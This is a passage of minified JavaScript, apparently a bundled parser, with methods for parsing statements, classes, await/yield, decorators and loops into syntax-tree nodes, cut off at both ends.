if(X==="arguments"){if(this.scope.inClassAndNotInNonArrowFunction){this.raise(x.ArgumentsInClass,Q);return}}}recordAwaitIfAllowed(){let X=this.prodParam.hasAwait;if(X&&!this.scope.inFunction)this.state.hasTopLevelAwait=!0;return X}parseAwait(X){let Q=this.startNodeAt(X);if(this.expressionScope.recordParameterInitializerError(x.AwaitExpressionFormalParameter,Q),this.eat(55))this.raise(x.ObsoleteAwaitStar,Q);if(!this.scope.inFunction&&!(this.optionFlags&1))if(this.isAmbiguousPrefixOrIdentifier())this.ambiguousScriptDifferentAst=!0;else this.sawUnambiguousESM=!0;if(!this.state.soloAwait)Q.argument=this.parseMaybeUnary(null,!0);return this.finishNode(Q,"AwaitExpression")}isAmbiguousPrefixOrIdentifier(){if(this.hasPrecedingLineBreak())return!0;let{type:X}=this.state;return X===53||X===10||X===0||aJ(X)||X===102&&!this.state.containsEsc||X===138||X===56||this.hasPlugin("v8intrinsic")&&X===54}parseYield(X){let Q=this.startNodeAt(X);this.expressionScope.recordParameterInitializerError(x.YieldInParameter,Q);let J=!1,Y=null;if(!this.hasPrecedingLineBreak())switch(J=this.eat(55),this.state.type){case 13:case 140:case 8:case 11:case 3:case 9:case 14:case 12:if(!J)break;default:Y=this.parseMaybeAssign()}return Q.delegate=J,Q.argument=Y,this.finishNode(Q,"YieldExpression")}parseImportCall(X){if(this.next(),X.source=this.parseMaybeAssignAllowIn(),X.options=null,this.eat(12))if(!this.match(11)){if(X.options=this.parseMaybeAssignAllowIn(),this.eat(12)){if(this.addTrailingCommaExtraToNode(X.options),!this.match(11)){do this.parseMaybeAssignAllowIn();while(this.eat(12)&&!this.match(11));this.raise(x.ImportCallArity,X)}}}else this.addTrailingCommaExtraToNode(X.source);return this.expect(11),this.finishNode(X,"ImportExpression")}checkPipelineAtInfixOperator(X,Q){if(this.hasPlugin(["pipelineOperator",{proposal:"smart"}])){if(X.type==="SequenceExpression")this.raise(x.PipelineHeadSequenceExpression,Q)}}parseSmartPipelineBodyInStyle(X,Q){if(this.isSimpleReference(X)){let J=this.startNodeAt(Q);return J.callee=X,this.finishNode(J,"PipelineBareFunction")}else{let J=this.startNodeAt(Q);return this.checkSmartPipeTopicBodyEarlyErrors(Q),J.expression=X,this.finishNode(J,"PipelineTopicExpression")}}isSimpleReference(X){switch(X.type){case"MemberExpression":return!X.computed&&this.isSimpleReference(X.object);case"Identifier":return!0;default:return!1}}checkSmartPipeTopicBodyEarlyErrors(X){if(this.match(19))throw this.raise(x.PipelineBodyNoArrow,this.state.startLoc);if(!this.topicReferenceWasUsedInCurrentContext())this.raise(x.PipelineTopicUnused,X)}withTopicBindingContext(X){let Q=this.state.topicContext;this.state.topicContext={maxNumOfResolvableTopics:1,maxTopicIndex:null};try{return X()}finally{this.state.topicContext=Q}}withSmartMixTopicForbiddingContext(X){if(this.hasPlugin(["pipelineOperator",{proposal:"smart"}])){let Q=this.state.topicContext;this.state.topicContext={maxNumOfResolvableTopics:0,maxTopicIndex:null};try{return X()}finally{this.state.topicContext=Q}}else return X()}withSoloAwaitPermittingContext(X){let Q=this.state.soloAwait;this.state.soloAwait=!0;try{return X()}finally{this.state.soloAwait=Q}}allowInAnd(X){let Q=this.prodParam.currentFlags();if(8&~Q){this.prodParam.enter(Q|8);try{return X()}finally{this.prodParam.exit()}}return X()}disallowInAnd(X){let Q=this.prodParam.currentFlags();if(8&Q){this.prodParam.enter(Q&-9);try{return X()}finally{this.prodParam.exit()}}return X()}registerTopicReference(){this.state.topicContext.maxTopicIndex=0}topicReferenceIsAllowedInCurrentContext(){return this.state.topicContext.maxNumOfResolvableTopics>=1}topicReferenceWasUsedInCurrentContext(){return this.state.topicContext.maxTopicIndex!=null&&this.state.topicContext.maxTopicIndex>=0}parseFSharpPipelineBody(X){let Q=this.state.startLoc;this.state.potentialArrowAt=this.state.start;let J=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!0;let Y=this.parseExprOp(this.parseMaybeUnaryOrPrivate(),Q,X);return this.state.inFSharpPipelineDirectBody=J,Y}parseModuleExpression(){this.expectPlugin("moduleBlocks");let X=this.startNode();if(this.next(),!this.match(5))this.unexpected(null,5);let Q=this.startNodeAt(this.state.endLoc);this.next();let J=this.initializeScopes(!0);this.enterInitialScopes();try{X.body=this.parseProgram(Q,8,"module")}finally{J()}return this.finishNode(X,"ModuleExpression")}parseVoidPattern(X){this.expectPlugin("discardBinding");let Q=this.startNode();if(X!=null)X.voidPatternLoc=this.state.startLoc;return this.next(),this.finishNode(Q,"VoidPattern")}parseMaybeAssignAllowInOrVoidPattern(X,Q,J){if(Q!=null&&this.match(88)){let Y=this.lookaheadCharCode();if(Y===44||Y===(X===3?93:X===8?125:41)||Y===61)return this.parseMaybeDefault(this.state.startLoc,this.parseVoidPattern(Q))}return this.parseMaybeAssignAllowIn(Q,J)}parsePropertyNamePrefixOperator(X){}}var OH={kind:1},ev={kind:2},Xx=/[\uD800-\uDFFF]/u,AH=/in(?:stanceof)?/y;function Qx(X,Q,J){for(let Y=0;Y<X.length;Y++){let W=X[Y],{type:G}=W;if(typeof G==="number"){{if(G===139){let{loc:H,start:$,value:z,end:U}=W,K=$+1,B=C9(H.start,1);X.splice(Y,1,new N8({type:D8(27),value:"#",start:$,end:K,startLoc:H.start,endLoc:B}),new N8({type:D8(132),value:z,start:K,end:U,startLoc:B,endLoc:H.end})),Y++;continue}if(aJ(G)){let{loc:H,start:$,value:z,end:U}=W,K=$+1,B=C9(H.start,1),q;if(Q.charCodeAt($-J)===96)q=new N8({type:D8(22),value:"`",start:$,end:K,startLoc:H.start,endLoc:B});else q=new N8({type:D8(8),value:"}",start:$,end:K,startLoc:H.start,endLoc:B});let Z,M,L,R;if(G===24)M=U-1,L=C9(H.end,-1),Z=z===null?null:z.slice(1,-1),R=new N8({type:D8(22),value:"`",start:M,end:U,startLoc:L,endLoc:H.end});else M=U-2,L=C9(H.end,-2),Z=z===null?null:z.slice(1,-2),R=new N8({type:D8(23),value:"${",start:M,end:U,startLoc:L,endLoc:H.end});X.splice(Y,1,q,new N8({type:D8(20),value:Z,start:K,end:M,startLoc:B,endLoc:L}),R),Y+=2;continue}}W.type=D8(G)}}return X}class eq extends tq{parseTopLevel(X,Q){if(X.program=this.parseProgram(Q,140,this.options.sourceType==="module"?"module":"script"),X.comments=this.comments,this.optionFlags&256)X.tokens=Qx(this.tokens,this.input,this.startIndex);return this.finishNode(X,"File")}parseProgram(X,Q,J){if(X.sourceType=J,X.interpreter=this.parseInterpreterDirective(),this.parseBlockBody(X,!0,!0,Q),this.inModule){if(!(this.optionFlags&64)&&this.scope.undefinedExports.size>0)for(let[W,G]of Array.from(this.scope.undefinedExports))this.raise(x.ModuleExportUndefined,G,{localName:W});this.addExtra(X,"topLevelAwait",this.state.hasTopLevelAwait)}let Y;if(Q===140)Y=this.finishNode(X,"Program");else Y=this.finishNodeAt(X,"Program",C9(this.state.startLoc,-1));return Y}stmtToDirective(X){let Q=this.castNodeTo(X,"Directive"),J=this.castNodeTo(X.expression,"DirectiveLiteral"),Y=J.value,W=this.input.slice(this.offsetToSourcePos(J.start),this.offsetToSourcePos(J.end)),G=J.value=W.slice(1,-1);return this.addExtra(J,"raw",W),this.addExtra(J,"rawValue",G),this.addExtra(J,"expressionValue",Y),Q.value=J,delete X.expression,Q}parseInterpreterDirective(){if(!this.match(28))return null;let X=this.startNode();return X.value=this.state.value,this.next(),this.finishNode(X,"InterpreterDirective")}isLet(){if(!this.isContextual(100))return!1;return this.hasFollowingBindingAtom()}isUsing(){if(!this.isContextual(107))return!1;let X=this.nextTokenInLineStart(),Q=this.codePointAtPos(X);return this.chStartsBindingIdentifier(Q,X)}isForUsing(){if(!this.isContextual(107))return!1;let X=this.nextTokenInLineStart(),Q=this.codePointAtPos(X);if(this.isUnparsedContextual(X,"of")){let J=this.lookaheadCharCodeSince(X+2);if(J!==61&&J!==58&&J!==59)return!1}if(this.chStartsBindingIdentifier(Q,X)||this.isUnparsedContextual(X,"void"))return!0;return!1}isAwaitUsing(){if(!this.isContextual(96))return!1;let X=this.nextTokenInLineStart();if(this.isUnparsedContextual(X,"using")){X=this.nextTokenInLineStartSince(X+5);let Q=this.codePointAtPos(X);if(this.chStartsBindingIdentifier(Q,X))return!0}return!1}chStartsBindingIdentifier(X,Q){if(I8(X)){if(AH.lastIndex=Q,AH.test(this.input)){let J=this.codePointAtPos(AH.lastIndex);if(!X5(J)&&J!==92)return!1}return!0}else if(X===92)return!0;else return!1}chStartsBindingPattern(X){return X===91||X===123}hasFollowingBindingAtom(){let X=this.nextTokenStart(),Q=this.codePointAtPos(X);return this.chStartsBindingPattern(Q)||this.chStartsBindingIdentifier(Q,X)}hasInLineFollowingBindingIdentifierOrBrace(){let X=this.nextTokenInLineStart(),Q=this.codePointAtPos(X);return Q===123||this.chStartsBindingIdentifier(Q,X)}allowsUsing(){return(this.scope.inModule||!this.scope.inTopLevel)&&!this.scope.inBareCaseStatement}parseModuleItem(){return this.parseStatementLike(15)}parseStatementListItem(){return this.parseStatementLike(6|(!this.options.annexB||this.state.strict?0:8))}parseStatementOrSloppyAnnexBFunctionDeclaration(X=!1){let Q=0;if(this.options.annexB&&!this.state.strict){if(Q|=4,X)Q|=8}return this.parseStatementLike(Q)}parseStatement(){return this.parseStatementLike(0)}parseStatementLike(X){let Q=null;if(this.match(26))Q=this.parseDecorators(!0);return this.parseStatementContent(X,Q)}parseStatementContent(X,Q){let J=this.state.type,Y=this.startNode(),W=!!(X&2),G=!!(X&4),H=X&1;switch(J){case 60:return this.parseBreakContinueStatement(Y,!0);case 63:return this.parseBreakContinueStatement(Y,!1);case 64:return this.parseDebuggerStatement(Y);case 90:return this.parseDoWhileStatement(Y);case 91:return this.parseForStatement(Y);case 68:if(this.lookaheadCharCode()===46)break;if(!G)this.raise(this.state.strict?x.StrictFunction:this.options.annexB?x.SloppyFunctionAnnexB:x.SloppyFunction,this.state.startLoc);return this.parseFunctionStatement(Y,!1,!W&&G);case 80:if(!W)this.unexpected();return this.parseClass(this.maybeTakeDecorators(Q,Y),!0);case 69:return this.parseIfStatement(Y);case 70:return this.parseReturnStatement(Y);case 71:return this.parseSwitchStatement(Y);case 72:return this.parseThrowStatement(Y);case 73:return this.parseTryStatement(Y);case 96:if(this.isAwaitUsing()){if(!this.allowsUsing())this.raise(x.UnexpectedUsingDeclaration,Y);else if(!W)this.raise(x.UnexpectedLexicalDeclaration,Y);else if(!this.recordAwaitIfAllowed())this.raise(x.AwaitUsingNotInAsyncContext,Y);return this.next(),this.parseVarStatement(Y,"await using")}break;case 107:if(this.state.containsEsc||!this.hasInLineFollowingBindingIdentifierOrBrace())break;if(!this.allowsUsing())this.raise(x.UnexpectedUsingDeclaration,this.state.startLoc);else if(!W)this.raise(x.UnexpectedLexicalDeclaration,this.state.startLoc);return this.parseVarStatement(Y,"using");case 100:{if(this.state.containsEsc)break;let U=this.nextTokenStart(),K=this.codePointAtPos(U);if(K!==91){if(!W&&this.hasFollowingLineBreak())break;if(!this.chStartsBindingIdentifier(K,U)&&K!==123)break}}case 75:if(!W)this.raise(x.UnexpectedLexicalDeclaration,this.state.startLoc);case 74:{let U=this.state.value;return this.parseVarStatement(Y,U)}case 92:return this.parseWhileStatement(Y);case 76:return this.parseWithStatement(Y);case 5:return this.parseBlock();case 13:return this.parseEmptyStatement(Y);case 83:{let U=this.lookaheadCharCode();if(U===40||U===46)break}case 82:{if(!(this.optionFlags&8)&&!H)this.raise(x.UnexpectedImportExport,this.state.startLoc);this.next();let U;if(J===83)U=this.parseImport(Y);else U=this.parseExport(Y,Q);return this.assertModuleNodeAllowed(U),U}default:if(this.isAsyncFunction()){if(!W)this.raise(x.AsyncFunctionInSingleStatementContext,this.state.startLoc);return this.next(),this.parseFunctionStatement(Y,!0,!W&&G)}}let $=this.state.value,z=this.parseExpression();if(w0(J)&&z.type==="Identifier"&&this.eat(14))return this.parseLabeledStatement(Y,$,z,X);else return this.parseExpressionStatement(Y,z,Q)}assertModuleNodeAllowed(X){if(!(this.optionFlags&8)&&!this.inModule)this.raise(x.ImportOutsideModule,X)}decoratorsEnabledBeforeExport(){if(this.hasPlugin("decorators-legacy"))return!0;return this.hasPlugin("decorators")&&this.getPluginOption("decorators","decoratorsBeforeExport")!==!1}maybeTakeDecorators(X,Q,J){if(X){var Y;if((Y=Q.decorators)!=null&&Y.length){if(typeof this.getPluginOption("decorators","decoratorsBeforeExport")!=="boolean")this.raise(x.DecoratorsBeforeAfterExport,Q.decorators[0]);Q.decorators.unshift(...X)}else Q.decorators=X;if(this.resetStartLocationFromNode(Q,X[0]),J)this.resetStartLocationFromNode(J,Q)}return Q}canHaveLeadingDecorator(){return this.match(80)}parseDecorators(X){let Q=[];do Q.push(this.parseDecorator());while(this.match(26));if(this.match(82)){if(!X)this.unexpected();if(!this.decoratorsEnabledBeforeExport())this.raise(x.DecoratorExportClass,this.state.startLoc)}else if(!this.canHaveLeadingDecorator())throw this.raise(x.UnexpectedLeadingDecorator,this.state.startLoc);return Q}parseDecorator(){this.expectOnePlugin(["decorators","decorators-legacy"]);let X=this.startNode();if(this.next(),this.hasPlugin("decorators")){let Q=this.state.startLoc,J;if(this.match(10)){let Y=this.state.startLoc;this.next(),J=this.parseExpression(),this.expect(11),J=this.wrapParenthesis(Y,J);let W=this.state.startLoc;if(X.expression=this.parseMaybeDecoratorArguments(J,Y),this.getPluginOption("decorators","allowCallParenthesized")===!1&&X.expression!==J)this.raise(x.DecoratorArgumentsOutsideParentheses,W)}else{J=this.parseIdentifier(!1);while(this.eat(16)){let Y=this.startNodeAt(Q);if(Y.object=J,this.match(139))this.classScope.usePrivateName(this.state.value,this.state.startLoc),Y.property=this.parsePrivateName();else Y.property=this.parseIdentifier(!0);Y.computed=!1,J=this.finishNode(Y,"MemberExpression")}X.expression=this.parseMaybeDecoratorArguments(J,Q)}}else X.expression=this.parseExprSubscripts();return this.finishNode(X,"Decorator")}parseMaybeDecoratorArguments(X,Q){if(this.eat(10)){let J=this.startNodeAt(Q);return J.callee=X,J.arguments=this.parseCallExpressionArguments(),this.toReferencedList(J.arguments),this.finishNode(J,"CallExpression")}return X}parseBreakContinueStatement(X,Q){if(this.next(),this.isLineTerminator())X.label=null;else X.label=this.parseIdentifier(),this.semicolon();return this.verifyBreakContinue(X,Q),this.finishNode(X,Q?"BreakStatement":"ContinueStatement")}verifyBreakContinue(X,Q){let J;for(J=0;J<this.state.labels.length;++J){let Y=this.state.labels[J];if(X.label==null||Y.name===X.label.name){if(Y.kind!=null&&(Q||Y.kind===1))break;if(X.label&&Q)break}}if(J===this.state.labels.length){let Y=Q?"BreakStatement":"ContinueStatement";this.raise(x.IllegalBreakContinue,X,{type:Y})}}parseDebuggerStatement(X){return this.next(),this.semicolon(),this.finishNode(X,"DebuggerStatement")}parseHeaderExpression(){this.expect(10);let X=this.parseExpression();return this.expect(11),X}parseDoWhileStatement(X){return this.next(),this.state.labels.push(OH),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.state.labels.pop(),this.expect(92),X.test=this.parseHeaderExpression(),this.eat(13),this.finishNode(X,"DoWhileStatement")}parseForStatement(X){this.next(),this.state.labels.push(OH);let Q=null;if(this.isContextual(96)&&this.recordAwaitIfAllowed())Q=this.state.startLoc,this.next();if(this.scope.enter(0),this.expect(10),this.match(13)){if(Q!==null)this.unexpected(Q);return this.parseFor(X,null)}let J=this.isContextual(100);{let $=this.isAwaitUsing(),z=$||this.isForUsing(),U=J&&this.hasFollowingBindingAtom()||z;if(this.match(74)||this.match(75)||U){let K=this.startNode(),B;if($){if(B="await using",!this.recordAwaitIfAllowed())this.raise(x.AwaitUsingNotInAsyncContext,this.state.startLoc);this.next()}else B=this.state.value;this.next(),this.parseVar(K,!0,B);let q=this.finishNode(K,"VariableDeclaration"),Z=this.match(58);if(Z&&z)this.raise(x.ForInUsing,q);if((Z||this.isContextual(102))&&q.declarations.length===1)return this.parseForIn(X,q,Q);if(Q!==null)this.unexpected(Q);return this.parseFor(X,q)}}let Y=this.isContextual(95),W=new E4,G=this.parseExpression(!0,W),H=this.isContextual(102);if(H){if(J)this.raise(x.ForOfLet,G);if(Q===null&&Y&&G.type==="Identifier")this.raise(x.ForOfAsync,G)}if(H||this.match(58)){this.checkDestructuringPrivate(W),this.toAssignable(G,!0);let $=H?"ForOfStatement":"ForInStatement";return this.checkLVal(G,{type:$}),this.parseForIn(X,G,Q)}else this.checkExpressionErrors(W,!0);if(Q!==null)this.unexpected(Q);return this.parseFor(X,G)}parseFunctionStatement(X,Q,J){return this.next(),this.parseFunction(X,1|(J?2:0)|(Q?8:0))}parseIfStatement(X){return this.next(),X.test=this.parseHeaderExpression(),X.consequent=this.parseStatementOrSloppyAnnexBFunctionDeclaration(),X.alternate=this.eat(66)?this.parseStatementOrSloppyAnnexBFunctionDeclaration():null,this.finishNode(X,"IfStatement")}parseReturnStatement(X){if(!this.prodParam.hasReturn)this.raise(x.IllegalReturn,this.state.startLoc);if(this.next(),this.isLineTerminator())X.argument=null;else X.argument=this.parseExpression(),this.semicolon();return this.finishNode(X,"ReturnStatement")}parseSwitchStatement(X){this.next(),X.discriminant=this.parseHeaderExpression();let Q=X.cases=[];this.expect(5),this.state.labels.push(ev),this.scope.enter(256);let J;for(let Y;!this.match(8);)if(this.match(61)||this.match(65)){let W=this.match(61);if(J)this.finishNode(J,"SwitchCase");if(Q.push(J=this.startNode()),J.consequent=[],this.next(),W)J.test=this.parseExpression();else{if(Y)this.raise(x.MultipleDefaultsInSwitch,this.state.lastTokStartLoc);Y=!0,J.test=null}this.expect(14)}else if(J)J.consequent.push(this.parseStatementListItem());else this.unexpected();if(this.scope.exit(),J)this.finishNode(J,"SwitchCase");return this.next(),this.state.labels.pop(),this.finishNode(X,"SwitchStatement")}parseThrowStatement(X){if(this.next(),this.hasPrecedingLineBreak())this.raise(x.NewlineAfterThrow,this.state.lastTokEndLoc);return X.argument=this.parseExpression(),this.semicolon(),this.finishNode(X,"ThrowStatement")}parseCatchClauseParam(){let X=this.parseBindingAtom();return this.scope.enter(this.options.annexB&&X.type==="Identifier"?8:0),this.checkLVal(X,{type:"CatchClause"},9),X}parseTryStatement(X){if(this.next(),X.block=this.parseBlock(),X.handler=null,this.match(62)){let Q=this.startNode();if(this.next(),this.match(10))this.expect(10),Q.param=this.parseCatchClauseParam(),this.expect(11);else Q.param=null,this.scope.enter(0);Q.body=this.withSmartMixTopicForbiddingContext(()=>this.parseBlock(!1,!1)),this.scope.exit(),X.handler=this.finishNode(Q,"CatchClause")}if(X.finalizer=this.eat(67)?this.parseBlock():null,!X.handler&&!X.finalizer)this.raise(x.NoCatchOrFinally,X);return this.finishNode(X,"TryStatement")}parseVarStatement(X,Q,J=!1){return this.next(),this.parseVar(X,!1,Q,J),this.semicolon(),this.finishNode(X,"VariableDeclaration")}parseWhileStatement(X){return this.next(),X.test=this.parseHeaderExpression(),this.state.labels.push(OH),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.state.labels.pop(),this.finishNode(X,"WhileStatement")}parseWithStatement(X){if(this.state.strict)this.raise(x.StrictWith,this.state.startLoc);return this.next(),X.object=this.parseHeaderExpression(),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.finishNode(X,"WithStatement")}parseEmptyStatement(X){return this.next(),this.finishNode(X,"EmptyStatement")}parseLabeledStatement(X,Q,J,Y){for(let G of this.state.labels)if(G.name===Q)this.raise(x.LabelRedeclaration,J,{labelName:Q});let W=$v(this.state.type)?1:this.match(71)?2:null;for(let G=this.state.labels.length-1;G>=0;G--){let H=this.state.labels[G];if(H.statementStart===X.start)H.statementStart=this.sourceToOffsetPos(this.state.start),H.kind=W;else break}return this.state.labels.push({name:Q,kind:W,statementStart:this.sourceToOffsetPos(this.state.start)}),X.body=Y&8?this.parseStatementOrSloppyAnnexBFunctionDeclaration(!0):this.parseStatement(),this.state.labels.pop(),X.label=J,this.finishNode(X,"LabeledStatement")}parseExpressionStatement(X,Q,J){return X.expression=Q,this.semicolon(),this.finishNode(X,"ExpressionStatement")}parseBlock(X=!1,Q=!0,J){let Y=this.startNode();if(X)this.state.strictErrors.clear();if(this.expect(5),Q)this.scope.enter(0);if(this.parseBlockBody(Y,X,!1,8,J),Q)this.scope.exit();return this.finishNode(Y,"BlockStatement")}isValidDirective(X){return X.type==="ExpressionStatement"&&X.expression.type==="StringLiteral"&&!X.expression.extra.parenthesized}parseBlockBody(X,Q,J,Y,W){let G=X.body=[],H=X.directives=[];this.parseBlockOrModuleBlockBody(G,Q?H:void 0,J,Y,W)}parseBlockOrModuleBlockBody(X,Q,J,Y,W){let G=this.state.strict,H=!1,$=!1;while(!this.match(Y)){let z=J?this.parseModuleItem():this.parseStatementListItem();if(Q&&!$){if(this.isValidDirective(z)){let U=this.stmtToDirective(z);if(Q.push(U),!H&&U.value.value==="use strict")H=!0,this.setStrict(!0);continue}$=!0,this.state.strictErrors.clear()}X.push(z)}if(W==null||W.call(this,H),!G)this.setStrict(!1);this.next()}parseFor(X,Q){return X.init=Q,this.semicolon(!1),X.test=this.match(13)?null:this.parseExpression(),this.semicolon(!1),X.update=this.match(11)?null:this.parseExpression(),this.expect(11),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.scope.exit(),this.state.labels.pop(),this.finishNode(X,"ForStatement")}parseForIn(X,Q,J){let Y=this.match(58);if(this.next(),Y){if(J!==null)this.unexpected(J)}else X.await=J!==null;if(Q.type==="VariableDeclaration"&&Q.declarations[0].init!=null&&(!Y||!this.options.annexB||this.state.strict||Q.kind!=="var"||Q.declarations[0].id.type!=="Identifier"))this.raise(x.ForInOfLoopInitializer,Q,{type:Y?"ForInStatement":"ForOfStatement"});if(Q.type==="AssignmentPattern")this.raise(x.InvalidLhs,Q,{ancestor:{type:"ForStatement"}});return X.left=Q,X.right=Y?this.parseExpression():this.parseMaybeAssignAllowIn(),this.expect(11),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.scope.exit(),this.state.labels.pop(),this.finishNode(X,Y?"ForInStatement":"ForOfStatement")}parseVar(X,Q,J,Y=!1){let W=X.declarations=[];X.kind=J;for(;;){let G=this.startNode();if(this.parseVarId(G,J),G.init=!this.eat(29)?null:Q?this.parseMaybeAssignDisallowIn():this.parseMaybeAssignAllowIn(),G.init===null&&!Y){if(G.id.type!=="Identifier"&&!(Q&&(this.match(58)||this.isContextual(102))))this.raise(x.DeclarationMissingInitializer,this.state.lastTokEndLoc,{kind:"destructuring"});else if((J==="const"||J==="using"||J==="await using")&&!(this.match(58)||this.isContextual(102)))this.raise(x.DeclarationMissingInitializer,this.state.lastTokEndLoc,{kind:J})}if(W.push(this.finishNode(G,"VariableDeclarator")),!this.eat(12))break}return X}parseVarId(X,Q){let J=this.parseBindingAtom();if(Q==="using"||Q==="await using"){if(J.type==="ArrayPattern"||J.type==="ObjectPattern")this.raise(x.UsingDeclarationHasBindingPattern,J.loc.start)}else if(J.type==="VoidPattern")this.raise(x.UnexpectedVoidPattern,J.loc.start);this.checkLVal(J,{type:"VariableDeclarator"},Q==="var"?5:8201),X.id=J}parseAsyncFunctionExpression(X){return this.parseFunction(X,8)}parseFunction(X,Q=0){let J=Q&2,Y=!!(Q&1),W=Y&&!(Q&4),G=!!(Q&8);if(this.initFunction(X,G),this.match(55)){if(J)this.raise(x.GeneratorInSingleStatementContext,this.state.startLoc);this.next(),X.generator=!0}if(Y)X.id=this.parseFunctionId(W);let H=this.state.maybeInArrowParameters;if(this.state.maybeInArrowParameters=!1,this.scope.enter(514),this.prodParam.enter(nJ(G,X.generator)),!Y)X.id=this.parseFunctionId();if(this.parseFunctionParams(X,!1),this.withSmartMixTopicForbiddingContext(()=>{this.parseFunctionBodyAndFinish(X,Y?"FunctionDeclaration":"FunctionExpression")}),this.prodParam.exit(),this.scope.exit(),Y&&!J)this.registerFunctionStatementId(X);return this.state.maybeInArrowParameters=H,X}parseFunctionId(X){return X||w0(this.state.type)?this.parseIdentifier():null}parseFunctionParams(X,Q){this.expect(10),this.expressionScope.enter(gv()),X.params=this.parseBindingList(11,41,2|(Q?4:0)),this.expressionScope.exit()}registerFunctionStatementId(X){if(!X.id)return;this.scope.declareName(X.id.name,!this.options.annexB||this.state.strict||X.generator||X.async?this.scope.treatFunctionsAsVar?5:8201:17,X.id.loc.start)}parseClass(X,Q,J){this.next();let Y=this.state.strict;return this.state.strict=!0,this.parseClassId(X,Q,J),this.parseClassSuper(X),X.body=this.parseClassBody(!!X.superClass,Y),this.finishNode(X,Q?"ClassDeclaration":"ClassExpression")}isClassProperty(){return this.match(29)||this.match(13)||this.match(8)}isClassMethod(){return this.match(10)}nameIsConstructor(X){return X.type==="Identifier"&&X.name==="constructor"||X.type==="StringLiteral"&&X.value==="constructor"}isNonstaticConstructor(X){return!X.computed&&!X.static&&this.nameIsConstructor(X.key)}parseClassBody(X,Q){this.classScope.enter();let J={hadConstructor:!1,hadSuperClass:X},Y=[],W=this.startNode();if(W.body=[],this.expect(5),this.withSmartMixTopicForbiddingContext(()=>{while(!this.match(8)){if(this.eat(13)){if(Y.length>0)throw this.raise(x.DecoratorSemicolon,this.state.lastTokEndLoc);continue}if(this.match(26)){Y.push(this.parseDecorator());continue}let G=this.startNode();if(Y.length)G.decorators=Y,this.resetStartLocationFromNode(G,Y[0]),Y=[];if(this.parseClassMember(W,G,J),G.kind==="constructor"&&G.decorators&&G.decorators.length>0)this.raise(x.DecoratorConstructor,G)}}),this.state.strict=Q,this.next(),Y.length)throw this.raise(x.TrailingDecorator,this.state.startLoc);return this.classScope.exit(),this.finishNode(W,"ClassBody")}parseClassMemberFromModifier(X,Q){let J=this.parseIdentifier(!0);if(this.isClassMethod()){let Y=Q;return Y.kind="method",Y.computed=!1,Y.key=J,Y.static=!1,this.pushClassMethod(X,Y,!1,!1,!1,!1),!0}else if(this.isClassProperty()){let Y=Q;return Y.computed=!1,Y.key=J,Y.static=!1,X.body.push(this.parseClassProperty(Y)),!0}return this.resetPreviousNodeTrailingComments(J),!1}parseClassMember(X,Q,J){let Y=this.isContextual(106);if(Y){if(this.parseClassMemberFromModifier(X,Q))return;if(this.eat(5)){this.parseClassStaticBlock(X,Q);return}}this.parseClassMemberWithIsStatic(X,Q,J,Y)}parseClassMemberWithIsStatic(X,Q,J,Y){let W=Q,G=Q,H=Q,$=Q,z=Q,U=W,K=W;if(Q.static=Y,this.parsePropertyNamePrefixOperator(Q),this.eat(55)){U.kind="method";let R=this.match(139);if(this.parseClassElementName(U),this.parsePostMemberNameModifiers(U),R){this.pushClassPrivateMethod(X,G,!0,!1);return}if(this.isNonstaticConstructor(W))this.raise(x.ConstructorIsGenerator,W.key);this.pushClassMethod(X,W,!0,!1,!1,!1);return}let B=!this.state.containsEsc&&w0(this.state.type),q=this.parseClassElementName(Q),Z=B?q.name:null,M=this.isPrivateName(q),L=this.state.startLoc;if(this.parsePostMemberNameModifiers(K),this.isClassMethod()){if(U.kind="method",M){this.pushClassPrivateMethod(X,G,!1,!1);return}let R=this.isNonstaticConstructor(W),j=!1;if(R){if(W.kind="constructor",J.hadConstructor&&!this.hasPlugin("typescript"))this.raise(x.DuplicateConstructor,q);if(R&&this.hasPlugin("typescript")&&Q.override)this.raise(x.OverrideOnConstructor,q);J.hadConstructor=!0,j=J.hadSuperClass}this.pushClassMethod(X,W,!1,!1,R,j)}else if(this.isClassProperty())if(M)this.pushClassPrivateProperty(X,$);else this.pushClassProperty(X,H);else if(Z==="async"&&!this.isLineTerminator()){this.resetPreviousNodeTrailingComments(q);let R=this.eat(55);if(K.optional)this.unexpected(L);U.kind="method";let j=this.match(139);if(this.parseClassElementName(U),this.parsePostMemberNameModifiers(K),j)this.pushClassPrivateMethod(X,G,R,!0);else{if(this.isNonstaticConstructor(W))this.raise(x.ConstructorIsAsync,W.key);this.pushClassMethod(X,W,R,!0,!1,!1)}}else if((Z==="get"||Z==="set")&&!(this.match(55)&&this.isLineTerminator())){this.resetPreviousNodeTrailingComments(q),U.kind=Z;let R=this.match(139);if(this.parseClassElementName(W),R)this.pushClassPrivateMethod(X,G,!1,!1);else{if(this.isNonstaticConstructor(W))this.raise(x.ConstructorIsAccessor,W.key);this.pushClassMethod(X,W,!1,!1,!1,!1)}this.checkGetterSetterParams(W)}else if(Z==="accessor"&&!this.isLineTerminator()){this.expectPlugin("decoratorAutoAccessors"),this.resetPreviousNodeTrailingComments(q);let R=this.match(139);this.parseClassElementName(H),this.pushClassAccessorProperty(X,z,R)}else if(this.isLineTerminator())if(M)this.pushClassPrivateProperty(X,$);else this.pushClassProperty(X,H);else this.unexpected()}parseClassElementName(X){let{type:Q,value:J}=this.state;if((Q===132||Q===134)&&X.static&&J==="prototype")this.raise(x.StaticPrototype,this.state.startLoc);if(Q===139){if(J==="constructor")this.raise(x.ConstructorClassPrivateField,this.state.startLoc);let Y=this.parsePrivateName();return X.key=Y,Y}return this.parsePropertyName(X),X.key}parseClassStaticBlock(X,Q){var J;this.scope.enter(720);let Y=this.state.labels;this.state.labels=[],this.prodParam.enter(0);let W=Q.body=[];if(this.parseBlockOrModuleBlockBody(W,void 0,!1,8),this.prodParam.exit(),this.scope.exit(),this.state.labels=Y,X.body.push(this.finishNode(Q,"StaticBlock")),(J=Q.decorators)!=null&&J.length)this.raise(x.DecoratorStaticBlock,Q)}pushClassProperty(X,Q){if(!Q.computed&&this.nameIsConstructor(Q.key))this.raise(x.ConstructorClassField,Q.key);X.body.push(this.parseClassProperty(Q))}pushClassPrivateProperty(X,Q){let 